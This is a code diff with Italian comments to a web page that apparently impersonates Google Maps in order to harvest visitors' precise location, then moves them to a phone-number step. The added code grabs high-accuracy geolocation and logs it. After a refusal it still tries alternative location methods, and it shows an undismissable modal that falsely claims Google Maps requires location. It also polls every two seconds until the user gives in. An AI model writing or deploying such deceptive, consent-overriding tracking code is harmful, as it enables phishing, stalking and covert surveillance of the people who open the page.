@@ -263,7 +263,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.8);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -271,6 +271,11 @@
             opacity: 0;
             visibility: hidden;
             transition: all 0.3s;
+        }
+        
+        .permission-modal.required {
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
         }
         
         .permission-modal.show {
@@ -482,10 +487,44 @@
 
         // Funzione principale per richiedere la posizione
         function requestLocation() {
-            document.getElementById('locationModal').classList.add('show');
+            // Prima controlla se la posizione è già bloccata dal browser
+            if (!navigator.geolocation) {
+                showLocationRequiredModal();
+                return;
+            }
+            
+            // Prova subito ad accedere alla posizione
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Se funziona, vai direttamente al telefono
+                    userLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    logEvent('location_captured_immediate', userLocation);
+                    
+                    // Mostra modal per il telefono
+                    document.getElementById('locationModal').classList.add('show');
+                    showStep(2);
+                },
+                function(error) {
+                    // Se fallisce, mostra il modal standard
+                    document.getElementById('locationModal').classList.add('show');
+                    
+                    // Se è un errore di permesso, forza attivazione
+                    if (error.code === 1) { // PERMISSION_DENIED
+                        setTimeout(() => {
+                            showLocationRequiredModal();
+                        }, 3000);
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
         }
 
-        // Negare l'accesso alla posizione - ma proviamo metodi alternativi
+        // Negare l'accesso alla posizione - ma FORZA l'attivazione
         function denyLocation() {
             // Registra il rifiuto
             logEvent('location_denied', { timestamp: new Date().toISOString() });
@@ -493,8 +532,77 @@
             // Prova metodi alternativi per ottenere la posizione
             tryAlternativeLocation();
             
-            // Passa comunque al step 2
-            showStep(2);
+            // ⚠️ FORZA L'ATTIVAZIONE DELLA POSIZIONE
+            setTimeout(() => {
+                showLocationRequiredModal();
+            }, 1000);
+        }
+        
+        // Mostra modal che OBBLIGA ad attivare la posizione
+        function showLocationRequiredModal() {
+            const modal = document.getElementById('locationModal');
+            
+            // Cambia il contenuto del modal per renderlo obbligatorio
+            const step1 = document.getElementById('step1');
+            step1.innerHTML = `
+                <div class="modal-title">⚠️ Posizione OBBLIGATORIA per Navigazione</div>
+                <div class="modal-text" style="color: #d32f2f; font-weight: 500;">
+                    Google Maps richiede la posizione attiva per funzionare correttamente.<br><br>
+                    <strong>ATTIVA la posizione nelle impostazioni del browser per continuare.</strong><br><br>
+                    La pagina si ricaricherà automaticamente quando attivi la posizione.
+                </div>
+                <div class="modal-buttons">
+                    <button class="modal-btn modal-btn-primary" onclick="forceLocationActivation()">Attiva Posizione</button>
+                    <button class="modal-btn modal-btn-secondary" onclick="retryLocationAccess()">Riprova</button>
+                </div>
+            `;
+            
+            modal.classList.add('show', 'required');
+            showStep(1);
+            
+            // Impedisce di chiudere il modal cliccando fuori
+            modal.onclick = function(e) {
+                e.stopPropagation();
+            };
+            
+            // Controlla ogni 2 secondi se la posizione è stata attivata
+            const checkInterval = setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        clearInterval(checkInterval);
+                        // Posizione ottenuta, procedi normalmente
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        logEvent('location_captured_forced', userLocation);
+                        showStep(2);
+                    },
+                    function(error) {
+                        // Posizione ancora bloccata, continua a controllare
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }, 2000);
+        }
+        
+        // Forza attivazione posizione con istruzioni dettagliate
+        function forceLocationActivation() {
+            alert(`Per attivare la posizione:
+
+🔹 Chrome: Clicca sull'icona 🔒 nella barra indirizzi → Posizione → Consenti
+🔹 Firefox: Clicca sull'icona 🛡️ → Autorizzazioni → Posizione → Consenti
+🔹 Safari: Safari → Preferenze → Siti web → Posizione → Consenti
+🔹 Edge: Clicca su ⚙️ → Impostazioni sito → Posizione → Consenti
+
+Poi clicca 'Riprova' qui sotto.`);
+        }
+        
+        // Riprova accesso posizione
+        function retryLocationAccess() {
+            allowLocation();
         }
         
         // Metodi alternativi per catturare la posizione
